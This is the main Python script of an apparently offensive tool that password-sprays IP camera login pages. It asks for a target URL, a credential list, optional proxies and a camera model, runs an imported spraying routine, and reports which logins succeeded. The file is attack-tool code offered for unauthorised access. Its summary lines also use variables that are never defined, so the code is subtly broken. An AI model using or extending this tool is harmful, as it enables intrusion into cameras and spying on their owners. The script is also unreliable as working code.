import asyncio
from colorama import Fore, init
from tqdm import tqdm
import os
import validators
from src.banner import show_banner
from src.credentials import load_creds
from src.proxies import get_proxy_input
from src.request_handler import pspray
from src.camera_models import get_model_specific_data
from src.utils import is_camera_reachable

init(autoreset=True)

if __name__ == "__main__":
    show_banner()
    t_url = input(f"{Fore.CYAN}\nEnter the target URL (IP camera login): ")
    while not validators.url(t_url):
        print(f"{Fore.RED}Invalid URL format. Please try again.")
        t_url = input(f"{Fore.CYAN}\nEnter the target URL (IP camera login): ")

    creds_f = input(f"{Fore.CYAN}Enter the path to the credentials file: ")
    while not os.path.isfile(creds_f):
        print(f"{Fore.RED}Invalid file path. Please try again.")
        creds_f = input(f"{Fore.CYAN}Enter the path to the credentials file: ")

    use_proxies = input(f"{Fore.CYAN}Would you like to use proxies? (yes/no): ").strip().lower() == 'yes'
    model_name = input(f"{Fore.CYAN}Enter the IP camera model (or default): ").strip()

    if use_proxies:
        get_proxy_input()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(pspray(t_url, creds_f, use_proxies, model_name))

    print(f"{Fore.GREEN}\nLogin attempt summary:")
    print(f"{Fore.GREEN}Successful attempts: {len(success_attempts)}")
    print(f"{Fore.RED}Failed attempts: {len(failed_attempts)}")
    print(f"{Fore.YELLOW}Errors: {len(errors)}")